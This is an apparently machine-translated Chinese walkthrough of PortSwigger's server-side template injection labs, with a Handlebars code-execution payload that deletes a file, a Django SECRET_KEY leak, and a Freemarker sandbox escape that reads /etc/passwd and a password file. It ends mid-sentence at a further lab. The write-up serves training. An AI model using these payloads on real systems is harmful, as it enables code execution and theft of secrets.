<html>
<head>
<title>Server Side Template Injections Portswiggers Labs Walkthrough Part III</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">服务器端模板注入端口触发器实验室演练第三部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/server-side-template-injections-portswiggers-labs-walkthrough-part-iii-bc6983412a3d?source=collection_archive---------2-----------------------#2022-08-27">https://infosecwriteups.com/server-side-template-injections-portswiggers-labs-walkthrough-part-iii-bc6983412a3d?source=collection_archive---------2-----------------------#2022-08-27</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="841c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">大家好，我是Hashar Mujahid，今天我们将解决更多来自Portswiggers的SSTI实验室问题。如果你想了解什么是服务器端模板注入，你可以阅读我以前的博客</p><ul class=""><li id="c180" class="kl km iq jp b jq jr ju jv jy kn kc ko kg kp kk kq kr ks kt bi translated"><a class="ae ku" href="https://medium.com/bugbountywriteup/server-side-template-injections-by-hashar-mujahid-e5a1a383027e" rel="noopener">服务器端模板注入I </a></li><li id="e4e0" class="kl km iq jp b jq kv ju kw jy kx kc ky kg kz kk kq kr ks kt bi translated"><a class="ae ku" href="https://medium.com/bugbountywriteup/server-side-template-injections-portswiggers-labs-walkthrough-5a1a06f057d2" rel="noopener">服务器端模板注入二</a></li></ul><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi la"><img src="../Images/470ad8543decd94c348fbb2b96fe96cf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*d_k_l6vM4Cg2MZe9Ex6MEg.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">SSTI</figcaption></figure><p id="ba8a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们从4号实验开始:</p><h1 id="027c" class="lq lr iq bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">未知语言中的服务器端模板注入，有记录的攻击:</h1><p id="8323" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">目标:</p><p id="d8e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个实验室容易受到<a class="ae ku" href="https://portswigger.net/web-security/server-side-template-injection" rel="noopener ugc nofollow" target="_blank">服务器端模板注入</a>的攻击。要解决这个实验，请识别模板引擎，并在网上找到一个可以用来执行任意代码的记录漏洞，然后从Carlos的主目录中删除<code class="fe mt mu mv mw b">morale.txt</code>文件。</p><p id="5f23" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们知道我们需要做什么了。所以让我们从寻找潜在的终点开始。</p><p id="a3e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一个view details按钮，它通过一个名为message的参数将我们重定向回主页。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi mx"><img src="../Images/240c73ae70fdf2d5a9984491004bfa92.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HxzH1CBU1pR-oDkZDCMprA.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">端点</figcaption></figure><p id="24ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到URL中的数据反映在页面上。我们也可以尝试跨站点脚本，BTW完美的工作</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi mx"><img src="../Images/05dd51cc178efa263d949b3d24a1dfea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4GWgHLmuPFgna87LLHKg9w.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">XSS</figcaption></figure><p id="0175" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">玩够了，让我们回到真正的任务上来。有了潜在的终点，我们可以测试它的模板注射。</p><p id="9610" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们将请求发送给入侵者，并用我们的有效载荷列表发起狙击攻击。</p><pre class="lb lc ld le gt my mw mz na aw nb bi"><span id="7f9f" class="nc lr iq mw b gy nd ne l nf ng">{{7*7}}  <br/>${7*7}  <br/>&lt;%= 7*7 %&gt;  <br/>${{7*7}}  <br/>#{7*7}</span></pre><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi nh"><img src="../Images/8421382e90028630293d7af148dfcb0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ix3pn3JNib3DuqzjG-R3-Q.png"/></div></div></figure><p id="f366" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从结果中我们可以看到，当我们命中一个无效的语法它内部的服务器错误发生，并给了我们一些信息。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi ni"><img src="../Images/bb2de647f3c45cdbab7bc89d91a30e97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DvSf4uAIvO6u44IcWnCqZg.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">结果</figcaption></figure><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi nj"><img src="../Images/9bf54e936a889b85514ac866f5f43903.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RCmIxcuG3_olj_sUUiRukw.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">错误</figcaption></figure><p id="ed74" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">错误消息确认我们正在使用车把模板引擎。</p><p id="5ea6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们在车把模板引擎谷歌RCE。</p><p id="1e7a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一个很棒的博客告诉我们如何利用这个模板引擎。</p><div class="nk nl gp gr nm nn"><a href="https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/" rel="noopener  ugc nofollow" target="_blank"><div class="no ab fo"><div class="np ab nq cl cj nr"><h2 class="bd ir gy z fp ns fr fs nt fu fw ip bi translated">NodeJS应用程序中的秘密参数LFR和潜在RCE</h2><div class="nu l"><h3 class="bd b gy z fp ns fr fs nt fu fw dk translated">如果您使用带手柄的ExpressJs作为通过hbs视图引擎调用的模板引擎，对于服务器端渲染…</h3></div><div class="nv l"><p class="bd b dl z fp ns fr fs nt fu fw dk translated">blog.shoebpatel.com</p></div></div><div class="nw l"><div class="nx l ny nz oa nw ob lk nn"/></div></div></a></div><pre class="lb lc ld le gt my mw mz na aw nb bi"><span id="2c92" class="nc lr iq mw b gy nd ne l nf ng">{{#with "s" as |string|}}<br/>  {{#with "e"}}<br/>    {{#with split as |conslist|}}<br/>      {{this.pop}}<br/>      {{this.push (lookup string.sub "constructor")}}<br/>      {{this.pop}}<br/>      {{#with string.split as |codelist|}}<br/>        {{this.pop}}<br/>        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}<br/>        {{this.pop}}<br/>        {{#each conslist}}<br/>          {{#with (string.sub.apply 0 codelist)}}<br/>            {{this}}<br/>          {{/with}}<br/>        {{/each}}<br/>      {{/with}}<br/>    {{/with}}<br/>  {{/with}}<br/>{{/with}}</span></pre><p id="9ef1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">基本上，我们可以使用这个有效负载来执行代码。我们需要首先对这个有效载荷进行URL编码，然后发送URL。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi mx"><img src="../Images/c99108846d291d1abd2a42038f08489a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N31E0YBrjSwUoeuqs30hMQ.png"/></div></div></figure><p id="c82a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">瞧啊。我们解决了。</p><p id="a72f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">去下一个。</p><h1 id="a846" class="lq lr iq bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">通过用户提供的对象进行信息公开的服务器端模板注入</h1><p id="0622" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">目标:</p><p id="ccb7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于对象传递到模板的方式，本实验室容易受到<a class="ae ku" href="https://portswigger.net/web-security/server-side-template-injection" rel="noopener ugc nofollow" target="_blank">服务器端模板注入</a>的攻击。该漏洞可被用来访问敏感数据。</p><p id="8f92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要解决实验室，窃取并提交框架的密钥。</p><p id="5f5c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以使用以下凭据登录您自己的帐户:</p><p id="b19b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mt mu mv mw b">content-manager:C0nt3ntM4n4g3r</code></p><p id="09f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到我们的凭据，我们应该有一些能力来编辑网站上的内容。</p><p id="3deb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们在产品的详细信息页面上有一个编辑模板按钮。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi oc"><img src="../Images/6dc11a20d3dd77c42195a337ad011fae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WpmDo6HwD07qw-9nESTxXw.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">编辑。</figcaption></figure><p id="f470" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以在最后一行看到，页面上的一些内容是动态的，如产品库存、名称和价格。这意味着使用了某种模板引擎。</p><p id="2296" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们确定正在使用什么样的模板引擎。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi od"><img src="../Images/996442b9dbaabf890a70046b8f59571a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zCH-shz-rlCTeX_5joSloQ.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">有效载荷</figcaption></figure><p id="2feb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们遇到了内部服务器错误。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi oe"><img src="../Images/2ccf41a3a21bf156c803626a54d910b7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aERXCH6cqsO7c8bY5-ZyPA.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">Django模板</figcaption></figure><p id="4690" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这告诉我们Django模板引擎正在被使用。让我们试着找到一些在系统上执行代码的方法。</p><figure class="lb lc ld le gt lf"><div class="bz fp l di"><div class="of og l"/></div></figure><p id="05d6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该pdf可能会帮助您利用此漏洞。</p><p id="6127" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我能够借助这个有效载荷触发XSS</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi oh"><img src="../Images/481b1fd9ab4f1986d754c929d603bd4b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SFQhM6J0gBuI7EWA_aPoxA.png"/></div></div></figure><p id="af87" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我们点击保存我们的XSS有效载荷触发器。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi oi"><img src="../Images/25de6984ecb7273accaea01b48e3da9b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ly61MrinEfV46TWO43FVxg.png"/></div></div></figure><p id="e3e3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以获得调试信息，但这很麻烦。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi oj"><img src="../Images/5f1fa4b7aa63e813921a1daa6e384877.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZwDmfGVgV1XmyKiYs0ViRg.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">调试</figcaption></figure><p id="3933" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">经过大量的试验和错误，我找到了有效载荷，以获得密钥</p><pre class="lb lc ld le gt my mw mz na aw nb bi"><span id="2edb" class="nc lr iq mw b gy nd ne l nf ng">{{settings.SECRET_KEY}}</span></pre><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi ok"><img src="../Images/4e097a3f06148c01a8fc7bbf0e5a6402.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cmobjecRyyv07dbc5WwChQ.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">秘密钥匙</figcaption></figure><p id="843e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在只需提交解决方案</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi ol"><img src="../Images/6bfb330086e9b2cfd714cfab67aad9e9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zUJvnq5UdRtIl5n2PrqlvA.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">解决</figcaption></figure></div><div class="ab cl om on hu oo" role="separator"><span class="op bw bk oq or os"/><span class="op bw bk oq or os"/><span class="op bw bk oq or"/></div><div class="ij ik il im in"><p id="03e4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在到专家级的实验室</p><h1 id="1b25" class="lq lr iq bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">沙箱环境中的服务器端模板注入</h1><p id="325a" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">目标:</p><p id="5f41" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">本实验使用Freemarker模板引擎。由于其沙箱实现不佳，它容易受到<a class="ae ku" href="https://portswigger.net/web-security/server-side-template-injection" rel="noopener ugc nofollow" target="_blank">服务器端模板注入</a>的攻击。要解决实验室问题，请跳出沙箱，从Carlos的主目录中读取文件<code class="fe mt mu mv mw b">my_password.txt</code>。然后提交文件的内容。</p><p id="0479" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以使用以下凭据登录您自己的帐户:</p><p id="966b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mt mu mv mw b">content-manager:C0nt3ntM4n4g3r</code></p><p id="962c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们已经知道实验室正在使用Freemarker模板，我们只需要从沙盒环境中脱离出来，阅读<code class="fe mt mu mv mw b">my_password.txt</code>的内容并提交它。</p><p id="57db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，只需登录您的帐户，然后转到“查看详细信息”按钮，您可以看到有一个“编辑模板”按钮，只需单击它，我们就会得到一个编辑器。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi oc"><img src="../Images/07dabcc0e190f40a6c5264f39c5acf99.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*f-NHW24sfBgJLKlSffKyPA.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">编者ˌ编辑</figcaption></figure><p id="a8c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到一些动态内容正被拖到页面上。让我们寻找利用和突破沙盒的方法。</p><p id="4f11" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我们尝试任何有效载荷来利用或执行我们可以看到的代码时，我们可以看到。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi ot"><img src="../Images/ffdd450de96e6a8e37f8dccc730af272.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*x7F0vYjRzvlX75bqEVpBBw.png"/></div></div></figure><p id="65d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不允许执行的调试错误消息。所以我们需要找到另一种方法，或者完全绕过这个沙盒。</p><div class="nk nl gp gr nm nn"><a href="https://ackcent.com/in-depth-freemarker-template-injection/" rel="noopener  ugc nofollow" target="_blank"><div class="no ab fo"><div class="np ab nq cl cj nr"><h2 class="bd ir gy z fp ns fr fs nt fu fw ip bi translated">深度Freemarker模板注入- Ackcent</h2><div class="nu l"><h3 class="bd b gy z fp ns fr fs nt fu fw dk translated">在最近的一次参与中，我们的AppSec团队遇到了一个有趣的例子，在…</h3></div><div class="nv l"><p class="bd b dl z fp ns fr fs nt fu fw dk translated">ackcent.com</p></div></div><div class="nw l"><div class="ou l ny nz oa nw ob lk nn"/></div></div></a></div><p id="91c4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">本文讨论了模板解析器，以限制哪些<code class="fe mt mu mv mw b">TemplateModels</code>可以在模板中实例化</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi ov"><img src="../Images/186430ae7cec7fd70eca6fe5ac32261e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LllmjvD8oIistYKJcXJ9RQ.png"/></div></div></figure><p id="62f5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到我们正面临着同样的防御。</p><p id="eb92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为他们解释说，如果设置了这种防御，我们就不能执行代码，我按下了“我相信”按钮。</p><p id="38c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里，当一切都失去了“有效载荷所有的东西”来拯救。</p><div class="nk nl gp gr nm nn"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker" rel="noopener  ugc nofollow" target="_blank"><div class="no ab fo"><div class="np ab nq cl cj nr"><h2 class="bd ir gy z fp ns fr fs nt fu fw ip bi translated">主swisskyrepo上的PayloadsAllTheThings/服务器端模板注入</h2><div class="nu l"><h3 class="bd b gy z fp ns fr fs nt fu fw dk translated">Web应用程序安全和Pentest/CTF-payloads all the things/服务器端的有用负载和旁路列表…</h3></div><div class="nv l"><p class="bd b dl z fp ns fr fs nt fu fw dk translated">github.com</p></div></div><div class="nw l"><div class="ow l ny nz oa nw ob lk nn"/></div></div></a></div><p id="6dca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">找到了一个有效负载来读取沙箱内的文件。</p><pre class="lb lc ld le gt my mw mz na aw nb bi"><span id="aa31" class="nc lr iq mw b gy nd ne l nf ng">${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}<br/>Convert the returned bytes to ASCII</span></pre><p id="c396" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们试试看，并阅读/etc/passwd。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi ox"><img src="../Images/43a1fea5d25d29518fd2952cd8b74ba4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IxWssczx0J-TG76DlGqDtw.png"/></div></div></figure><p id="f84e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在将字节转换成ASCII字符。</p><pre class="lb lc ld le gt my mw mz na aw nb bi"><span id="3347" class="nc lr iq mw b gy nd ne l nf ng">root:x:0:0:root:/root:/bin/bash<br/>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>sync:x:4:65534:sync:/bin:/bin/sync<br/>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br/>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br/>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br/>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br/>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br/>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br/>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br/>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br/>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br/>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br/>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br/>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br/>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br/>peter:x:12001:12001::/home/peter:/bin/bash<br/>carlos:x:12002:12002::/home/carlos:/bin/bash<br/>user:x:12000:12000::/home/user:/bin/bash<br/>elmer:x:12099:12099::/home/elmer:/bin/bash<br/>academy:x:10000:10000::/academy:/bin/bash<br/>messagebus:x:101:101::/nonexistent:/usr/sbin/nologin<br/>dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span></pre><p id="bfa9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们读一下<code class="fe mt mu mv mw b">my_password.txt</code></p><p id="bf08" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有效载荷</p><pre class="lb lc ld le gt my mw mz na aw nb bi"><span id="dc56" class="nc lr iq mw b gy nd ne l nf ng">${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}</span></pre><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi oy"><img src="../Images/dfb83592c75342c90df1421da1a19648.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gfRg-Z4MKBXOfLyv3iZ2-w.png"/></div></div></figure><p id="b429" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们来换算一下。</p><div class="nk nl gp gr nm nn"><a href="https://onlineasciitools.com/convert-bytes-to-ascii" rel="noopener  ugc nofollow" target="_blank"><div class="no ab fo"><div class="np ab nq cl cj nr"><h2 class="bd ir gy z fp ns fr fs nt fu fw ip bi translated">将字节转换为ASCII -在线ASCII工具</h2><div class="nu l"><h3 class="bd b gy z fp ns fr fs nt fu fw dk translated">字节到ascii转换工具什么是字节到ascii转换器？这个工具将字节作为输入，并将它们转换成…</h3></div><div class="nv l"><p class="bd b dl z fp ns fr fs nt fu fw dk translated">onlineasciitools.com</p></div></div><div class="nw l"><div class="oz l ny nz oa nw ob lk nn"/></div></div></a></div><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi pa"><img src="../Images/ed380e441d10aa6bb75cc9e6f27c1dca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*quffGTALlJ5sdxF-UrfTfA.png"/></div></div></figure><pre class="lb lc ld le gt my mw mz na aw nb bi"><span id="4ddb" class="nc lr iq mw b gy nd ne l nf ng"><br/>h60nfm92xjzoxywtpy0m</span></pre><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi mx"><img src="../Images/2287f66a91148d48c746bbeebacc8c9a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5d_0P3CtzlMhCXMbUViNDw.png"/></div></div></figure><p id="8441" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用DJ Khaled的声音</p><figure class="lb lc ld le gt lf"><div class="bz fp l di"><div class="pb og l"/></div></figure></div><div class="ab cl om on hu oo" role="separator"><span class="op bw bk oq or os"/><span class="op bw bk oq or os"/><span class="op bw bk oq or"/></div><div class="ij ik il im in"><p id="53ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae ku" href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">服务器端模板注入自定义漏洞利用</strong> </a> <strong class="jp ir"> : </strong></p><p id="7ad9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个实验室容易受到<a class="ae ku" href="https://portswigger.net/web-security/server-side-template-injection" rel="noopener ugc nofollow" target="_blank">服务器端模板注入</a>的攻击。为了解决这个实验，创建一个自定义漏洞，从Carlos的主目录中删除文件<code class="fe mt mu mv mw b">/.ssh/id_rsa</code>。</p><p id="b60b" 